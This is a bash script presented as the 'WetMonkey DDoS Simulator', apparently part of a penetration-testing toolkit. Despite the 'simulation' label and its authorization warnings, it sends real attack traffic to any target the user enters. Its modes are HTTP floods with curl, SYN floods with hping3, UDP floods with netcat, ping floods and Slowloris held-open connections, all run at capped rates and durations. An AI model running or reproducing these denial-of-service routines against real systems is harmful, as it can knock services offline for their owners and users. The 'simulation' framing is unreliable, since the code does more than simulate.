#!/usr/bin/env bash
# wetmonkey ddos – Interactive DDoS Simulation Module v2.0
set -euo pipefail

# Cleanup function for graceful exit
cleanup() {
    local exit_code=$?
    if [ $exit_code -ne 0 ]; then
        echo -e "\n\033[1;33m⚠ DDoS simulation interrupted or failed\033[0m" >&2
        log_json "ddos_interrupted" "exit_code=$exit_code" 2>/dev/null || true
    fi
    # Kill any background processes
    jobs -p | xargs -r kill 2>/dev/null || true
    exit $exit_code
}

# Set trap for cleanup
trap cleanup EXIT INT TERM
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$SCRIPT_DIR/../../"
source "$BASE_DIR/core/utils.sh"

# Configuration
VERSION="2.0"
MAX_DURATION=300  # 5 minutes max
DEFAULT_THREADS=10

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${MAGENTA}"
    echo "╔══════════════════════════════════════════╗"
    echo "║        💥 WetMonkey DDoS Simulator      ║"
    echo "║         Interactive Mode v2.0           ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    echo "WetMonkey DDoS Simulation Module v${VERSION}"
    echo ""
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -h, --help     Show this help message"
    echo "  -t, --target   Target host (legacy mode)"
    echo "  -p, --port     Target port (legacy mode)"
    echo "  -d, --duration Duration in seconds (legacy mode)"
    echo "  -m, --method   Attack method (legacy mode)"
    echo ""
    echo "This module provides interactive DDoS simulation for testing purposes."
    echo "Supported methods: HTTP flood, SYN flood, UDP flood, ICMP flood, Slowloris"
    echo ""
    echo "Example:"
    echo "  $0              # Run in interactive mode"
    echo "  $0 -h           # Show this help"
    echo "  $0 -t 127.0.0.1 -p 80 -m http -d 30  # Legacy mode"
    echo ""
    echo "Note: This tool is for authorized penetration testing only!"
    echo "      Use responsibly and only on systems you own or have permission to test."
    echo "      This is a SIMULATION tool for educational purposes."
}

# Simple interactive input function
simple_input() {
    local prompt="$1"
    local default="${2:-}"
    local input

    if [ -n "$default" ]; then
        echo -ne "${BLUE}$prompt [${YELLOW}$default${BLUE}]: ${NC}" >&2
    else
        echo -ne "${BLUE}$prompt: ${NC}" >&2
    fi

    read -r input
    echo "${input:-$default}"
}

# Simple yes/no function
ask_yes_no() {
    local prompt="$1"
    local default="${2:-n}"
    local response

    while true; do
        if [ "$default" = "y" ]; then
            echo -ne "${BLUE}$prompt [Y/n]: ${NC}" >&2
        else
            echo -ne "${BLUE}$prompt [y/N]: ${NC}" >&2
        fi

        read -r response
        response="${response:-$default}"

        case "$response" in
            [Yy]|[Yy][Ee][Ss]) return 0 ;;
            [Nn]|[Nn][Oo]) return 1 ;;
            *) echo -e "${RED}Please answer yes or no.${NC}" >&2 ;;
        esac
    done
}

# Function to validate IP address
validate_ip() {
    local ip="$1"
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        local IFS='.'
        local -a octets=($ip)
        for octet in "${octets[@]}"; do
            if (( octet > 255 )); then
                return 1
            fi
        done
        return 0
    fi
    return 1
}

# Function to validate hostname
validate_hostname() {
    local hostname="$1"
    if [[ ${#hostname} -gt 255 ]]; then
        return 1
    fi
    if [[ $hostname =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        return 0
    fi
    return 1
}

# Function to test connectivity
test_connectivity() {
    local target="$1"
    local port="$2"

    echo -e "${YELLOW}Testing connectivity to $target:$port...${NC}" >&2

    if timeout 5 bash -c "</dev/tcp/$target/$port" 2>/dev/null; then
        echo -e "${GREEN}✓ Target is reachable${NC}" >&2
        return 0
    else
        echo -e "${YELLOW}⚠ Target may not be reachable (continuing anyway)${NC}" >&2
        return 0  # Don't fail, just warn
    fi
}

# HTTP Flood simulation
simulate_http_flood() {
    local target="$1"
    local port="$2"
    local duration="$3"
    local threads="$4"

    echo -e "\n${GREEN}🚀 Starting HTTP Flood simulation...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Threads: $threads${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    local requests_sent=0

    echo -e "${CYAN}Simulating HTTP flood attack... Press Ctrl+C to stop${NC}\n"

    # Simulate HTTP requests
    while [ $(date +%s) -lt $end_time ]; do
        for ((i=1; i<=threads; i++)); do
            # Simulate HTTP request (using curl with timeout)
            # Temporarily disable error exit for curl command
            set +e
            curl -s --connect-timeout 1 --max-time 2 "http://$target:$port/" >/dev/null 2>&1
            local curl_exit_code=$?
            set -e
            
            if [ $curl_exit_code -eq 0 ]; then
                requests_sent=$((requests_sent + 1))
                echo -e "${GREEN}✓ Request $requests_sent sent successfully${NC}"
            else
                requests_sent=$((requests_sent + 1))
                echo -e "${YELLOW}⚠ Request $requests_sent failed (connection/timeout)${NC}"
            fi

            # Small delay to prevent overwhelming
            sleep 0.1
        done

        # Show progress
        local current_time=$(date +%s)
        local elapsed=$((current_time - start_time))
        local remaining=$((duration - elapsed))
        echo -e "${BLUE}Progress: ${elapsed}s elapsed, ${remaining}s remaining, $requests_sent requests sent${NC}"

        sleep 1
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ HTTP Flood simulation completed${NC}"
    echo -e "${BLUE}Total requests sent: $requests_sent${NC}"
    echo -e "${BLUE}Duration: $duration seconds${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# SYN Flood simulation
simulate_syn_flood() {
    local target="$1"
    local port="$2"
    local duration="$3"
    local packets="$4"

    echo -e "\n${GREEN}🚀 Starting SYN Flood simulation...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Packets per second: $packets${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    local packets_sent=0

    echo -e "${CYAN}Simulating SYN flood attack... Press Ctrl+C to stop${NC}\n"

    # Simulate SYN packets using hping3 if available, otherwise simulate
    if command -v hping3 &> /dev/null; then
        echo -e "${YELLOW}Using hping3 for SYN flood simulation${NC}"
        set +e
        timeout "$duration" hping3 -S -p "$port" -i u100000 "$target" 2>/dev/null
        set -e
        packets_sent=$((duration * packets))
    else
        echo -e "${YELLOW}Simulating SYN flood (hping3 not available)${NC}"
        while [ $(date +%s) -lt $end_time ]; do
            for ((i=1; i<=packets; i++)); do
                # Simulate SYN packet attempt
                set +e
                timeout 1 bash -c "</dev/tcp/$target/$port" 2>/dev/null
                local tcp_exit_code=$?
                set -e
                
                if [ $tcp_exit_code -eq 0 ]; then
                    packets_sent=$((packets_sent + 1))
                    echo -e "${GREEN}✓ SYN packet $packets_sent simulated${NC}"
                else
                    packets_sent=$((packets_sent + 1))
                    echo -e "${YELLOW}⚠ SYN packet $packets_sent failed${NC}"
                fi
            done
            sleep 1
        done
    fi

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ SYN Flood simulation completed${NC}"
    echo -e "${BLUE}Total packets sent: $packets_sent${NC}"
    echo -e "${BLUE}Duration: $duration seconds${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# UDP Flood simulation
simulate_udp_flood() {
    local target="$1"
    local port="$2"
    local duration="$3"
    local packets="$4"

    echo -e "\n${GREEN}🚀 Starting UDP Flood simulation...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Packets per second: $packets${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    local packets_sent=0

    echo -e "${CYAN}Simulating UDP flood attack... Press Ctrl+C to stop${NC}\n"

    # Simulate UDP packets
    while [ $(date +%s) -lt $end_time ]; do
        for ((i=1; i<=packets; i++)); do
            # Send UDP packet using netcat or echo
            set +e
            if command -v nc &> /dev/null; then
                echo "UDP_FLOOD_TEST_DATA" | nc -u -w1 "$target" "$port" 2>/dev/null
                local nc_exit_code=$?
            else
                # Fallback simulation
                echo "UDP_FLOOD_TEST_DATA" > /dev/udp/"$target"/"$port" 2>/dev/null
                local nc_exit_code=$?
            fi
            set -e
            
            packets_sent=$((packets_sent + 1))
            if [ $nc_exit_code -eq 0 ]; then
                echo -e "${GREEN}✓ UDP packet $packets_sent sent${NC}"
            else
                echo -e "${YELLOW}⚠ UDP packet $packets_sent failed${NC}"
            fi
        done
        sleep 1
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ UDP Flood simulation completed${NC}"
    echo -e "${BLUE}Total packets sent: $packets_sent${NC}"
    echo -e "${BLUE}Duration: $duration seconds${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# ICMP Flood simulation
simulate_icmp_flood() {
    local target="$1"
    local duration="$2"
    local packets="$3"

    echo -e "\n${GREEN}🚀 Starting ICMP Flood simulation...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW}Target: $target${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Packets per second: $packets${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    local packets_sent=0

    echo -e "${CYAN}Simulating ICMP flood attack... Press Ctrl+C to stop${NC}\n"

    # Simulate ICMP packets using ping
    while [ $(date +%s) -lt $end_time ]; do
        for ((i=1; i<=packets; i++)); do
            set +e
            ping -c 1 -W 1 "$target" >/dev/null 2>&1
            local ping_exit_code=$?
            set -e
            
            packets_sent=$((packets_sent + 1))
            if [ $ping_exit_code -eq 0 ]; then
                echo -e "${GREEN}✓ ICMP packet $packets_sent sent${NC}"
            else
                echo -e "${YELLOW}⚠ ICMP packet $packets_sent failed${NC}"
            fi
        done
        sleep 1
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ ICMP Flood simulation completed${NC}"
    echo -e "${BLUE}Total packets sent: $packets_sent${NC}"
    echo -e "${BLUE}Duration: $duration seconds${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# Slowloris simulation
simulate_slowloris() {
    local target="$1"
    local port="$2"
    local duration="$3"
    local connections="$4"

    echo -e "\n${GREEN}🚀 Starting Slowloris simulation...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Connections: $connections${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    local connections_made=0

    echo -e "${CYAN}Simulating Slowloris attack... Press Ctrl+C to stop${NC}\n"

    # Simulate slow HTTP connections
    while [ $(date +%s) -lt $end_time ]; do
        for ((i=1; i<=connections; i++)); do
            # Simulate partial HTTP request
            set +e
            {
                echo -e "GET / HTTP/1.1\r"
                echo -e "Host: $target\r"
                echo -e "User-Agent: Mozilla/5.0\r"
                sleep 10  # Keep connection open
            } | timeout 15 nc "$target" "$port" >/dev/null 2>&1 &
            set -e

            connections_made=$((connections_made + 1))
            echo -e "${GREEN}✓ Slowloris connection $connections_made initiated${NC}"
        done

        # Show progress
        local current_time=$(date +%s)
        local elapsed=$((current_time - start_time))
        local remaining=$((duration - elapsed))
        echo -e "${BLUE}Progress: ${elapsed}s elapsed, ${remaining}s remaining${NC}"

        sleep 5  # Wait before next batch
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ Slowloris simulation completed${NC}"
    echo -e "${BLUE}Total connections: $connections_made${NC}"
    echo -e "${BLUE}Duration: $duration seconds${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"
}

# Main interactive function
interactive_mode() {
    while true; do
        show_banner

        echo -e "${GREEN}Welcome to WetMonkey DDoS Simulator!${NC}"
        echo -e "${YELLOW}Let's set up your DDoS simulation step by step.${NC}\n"
        echo -e "${RED}⚠ WARNING: This is a SIMULATION tool for educational purposes only!${NC}"
        echo -e "${RED}⚠ Only use against systems you own or have explicit permission to test!${NC}\n"

        # Step 1: Target selection
        echo -e "${GREEN}Step 1: Target Selection${NC}"
        echo -e "Enter the target you want to test (IP address or hostname)"

        local target
        while true; do
            target=$(simple_input "Target")
            if [ -z "$target" ]; then
                echo -e "${RED}Target is required!${NC}"
                continue
            fi

            if validate_ip "$target" || validate_hostname "$target"; then
                break
            else
                echo -e "${RED}Please enter a valid IP address or hostname${NC}"
            fi
        done

        # Step 2: Attack method selection
        echo -e "\n${GREEN}Step 2: Attack Method${NC}"
        echo -e "Choose the DDoS simulation method:"
        echo -e "  ${YELLOW}1)${NC} HTTP Flood - Overwhelm web server with HTTP requests"
        echo -e "  ${YELLOW}2)${NC} SYN Flood - TCP SYN packet flood"
        echo -e "  ${YELLOW}3)${NC} UDP Flood - UDP packet flood"
        echo -e "  ${YELLOW}4)${NC} ICMP Flood - ICMP ping flood"
        echo -e "  ${YELLOW}5)${NC} Slowloris - Slow HTTP connection attack"

        local method
        local method_name
        while true; do
            choice=$(simple_input "Select method (1-5)")
            case "$choice" in
                "1") method="http"; method_name="HTTP Flood"; break ;;
                "2") method="syn"; method_name="SYN Flood"; break ;;
                "3") method="udp"; method_name="UDP Flood"; break ;;
                "4") method="icmp"; method_name="ICMP Flood"; break ;;
                "5") method="slowloris"; method_name="Slowloris"; break ;;
                *) echo -e "${RED}Please select a number between 1-5${NC}" ;;
            esac
        done

        # Step 3: Port configuration (for applicable methods)
        local port=80
        if [[ "$method" != "icmp" ]]; then
            echo -e "\n${GREEN}Step 3: Port Configuration${NC}"
            while true; do
                port=$(simple_input "Target port" "$port")
                if [[ "$port" =~ ^[0-9]+$ ]] && (( port >= 1 )) && (( port <= 65535 )); then
                    break
                else
                    echo -e "${RED}Port must be a number between 1-65535${NC}"
                fi
            done

            # Test connectivity
            test_connectivity "$target" "$port"
        fi

        # Step 4: Duration configuration
        echo -e "\n${GREEN}Step 4: Attack Duration${NC}"
        local duration
        while true; do
            duration=$(simple_input "Duration in seconds (max $MAX_DURATION)" "30")
            if [[ "$duration" =~ ^[0-9]+$ ]] && (( duration >= 1 )) && (( duration <= MAX_DURATION )); then
                break
            else
                echo -e "${RED}Duration must be between 1 and $MAX_DURATION seconds${NC}"
            fi
        done

        # Step 5: Intensity configuration
        echo -e "\n${GREEN}Step 5: Attack Intensity${NC}"
        local intensity
        case "$method" in
            "http"|"slowloris")
                intensity=$(simple_input "Number of threads/connections" "$DEFAULT_THREADS")
                if ! [[ "$intensity" =~ ^[0-9]+$ ]] || (( intensity < 1 )) || (( intensity > 50 )); then
                    intensity=$DEFAULT_THREADS
                    echo -e "${YELLOW}Using default: $intensity threads${NC}"
                fi
                ;;
            "syn"|"udp"|"icmp")
                intensity=$(simple_input "Packets per second" "10")
                if ! [[ "$intensity" =~ ^[0-9]+$ ]] || (( intensity < 1 )) || (( intensity > 100 )); then
                    intensity=10
                    echo -e "${YELLOW}Using default: $intensity packets/second${NC}"
                fi
                ;;
        esac

        # Step 6: Final confirmation
        echo -e "\n${GREEN}=== DDoS Simulation Summary ===${NC}"
        echo -e "${YELLOW}Target:${NC} $target"
        if [[ "$method" != "icmp" ]]; then
            echo -e "${YELLOW}Port:${NC} $port"
        fi
        echo -e "${YELLOW}Method:${NC} $method_name"
        echo -e "${YELLOW}Duration:${NC} $duration seconds"
        case "$method" in
            "http"|"slowloris")
                echo -e "${YELLOW}Threads/Connections:${NC} $intensity"
                ;;
            "syn"|"udp"|"icmp")
                echo -e "${YELLOW}Packets per second:${NC} $intensity"
                ;;
        esac

        echo -e "\n${RED}⚠ WARNING: This will simulate a DDoS attack against the target!${NC}"
        echo -e "${RED}⚠ Only proceed if you have authorization to test this target!${NC}"
        echo -e "${RED}⚠ The target may become temporarily unavailable during the test!${NC}"

        if ask_yes_no "Start the DDoS simulation?" "n"; then
            echo -e "\n${CYAN}Starting DDoS simulation...${NC}"

            # Log start
            log_json "ddos_start" "target=$target method=$method port=$port duration=$duration" 2>/dev/null || true

            # Execute simulation
            case "$method" in
                "http")
                    simulate_http_flood "$target" "$port" "$duration" "$intensity"
                    ;;
                "syn")
                    simulate_syn_flood "$target" "$port" "$duration" "$intensity"
                    ;;
                "udp")
                    simulate_udp_flood "$target" "$port" "$duration" "$intensity"
                    ;;
                "icmp")
                    simulate_icmp_flood "$target" "$duration" "$intensity"
                    ;;
                "slowloris")
                    simulate_slowloris "$target" "$port" "$duration" "$intensity"
                    ;;
            esac

            # Log end
            log_json "ddos_end" "target=$target method=$method" 2>/dev/null || true

            echo -e "\n${YELLOW}Press Enter to continue...${NC}"
            read -r
            break
        else
            echo -e "${YELLOW}Simulation cancelled.${NC}"
            if ! ask_yes_no "Configure a new simulation?" "y"; then
                break
            fi
        fi
    done
}

# Legacy command-line mode
legacy_mode() {
    local target="$1"
    local port="$2"
    local method="$3"
    local duration="$4"

    echo -e "${YELLOW}Running in legacy mode...${NC}"
    echo -e "${RED}⚠ WARNING: This is a SIMULATION tool for educational purposes only!${NC}\n"

    # Validate inputs
    if ! validate_ip "$target" && ! validate_hostname "$target"; then
        echo -e "${RED}Error: Invalid target format${NC}" >&2
        exit 1
    fi

    if ! [[ "$port" =~ ^[0-9]+$ ]] || (( port < 1 )) || (( port > 65535 )); then
        echo -e "${RED}Error: Invalid port number${NC}" >&2
        exit 1
    fi

    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )) || (( duration > MAX_DURATION )); then
        echo -e "${RED}Error: Duration must be between 1 and $MAX_DURATION seconds${NC}" >&2
        exit 1
    fi

    # Log start
    log_json "ddos_start" "target=$target method=$method port=$port duration=$duration mode=legacy" 2>/dev/null || true

    # Execute simulation
    case "$method" in
        "http")
            simulate_http_flood "$target" "$port" "$duration" "$DEFAULT_THREADS"
            ;;
        "syn")
            simulate_syn_flood "$target" "$port" "$duration" "10"
            ;;
        "udp")
            simulate_udp_flood "$target" "$port" "$duration" "10"
            ;;
        "icmp")
            simulate_icmp_flood "$target" "$duration" "10"
            ;;
        "slowloris")
            simulate_slowloris "$target" "$port" "$duration" "$DEFAULT_THREADS"
            ;;
        *)
            echo -e "${RED}Error: Unknown method '$method'${NC}" >&2
            echo "Supported methods: http, syn, udp, icmp, slowloris" >&2
            exit 1
            ;;
    esac

    # Log end
    log_json "ddos_end" "target=$target method=$method" 2>/dev/null || true
}

# Parse command line arguments
target=""
port=""
method=""
duration=""

if [[ $# -gt 0 ]]; then
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                show_help
                exit 0
                ;;
            -t|--target)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -t requires a target${NC}" >&2
                    exit 1
                fi
                target="$2"
                shift 2
                ;;
            -p|--port)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -p requires a port${NC}" >&2
                    exit 1
                fi
                port="$2"
                shift 2
                ;;
            -m|--method)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -m requires a method${NC}" >&2
                    exit 1
                fi
                method="$2"
                shift 2
                ;;
            -d|--duration)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -d requires a duration${NC}" >&2
                    exit 1
                fi
                duration="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}" >&2
                echo "Use -h for help." >&2
                exit 1
                ;;
        esac
    done

    # Legacy mode - all parameters must be provided
    if [[ -n "$target" && -n "$port" && -n "$method" && -n "$duration" ]]; then
        legacy_mode "$target" "$port" "$method" "$duration"
        exit 0
    elif [[ -n "$target" || -n "$port" || -n "$method" || -n "$duration" ]]; then
        echo -e "${RED}Error: All parameters (-t, -p, -m, -d) are required for legacy mode${NC}" >&2
        echo "Use -h for help or run without arguments for interactive mode." >&2
        exit 1
    fi
fi

# Check dependencies
missing_deps=()
if ! command -v curl &> /dev/null; then
    missing_deps+=("curl")
fi
if ! command -v nc &> /dev/null; then
    missing_deps+=("netcat")
fi

if [ ${#missing_deps[@]} -gt 0 ]; then
    echo -e "${YELLOW}Warning: Some optional dependencies are missing: ${missing_deps[*]}${NC}"
    echo -e "${YELLOW}Some simulation methods may have reduced functionality.${NC}\n"
fi

# Start interactive mode
interactive_mode
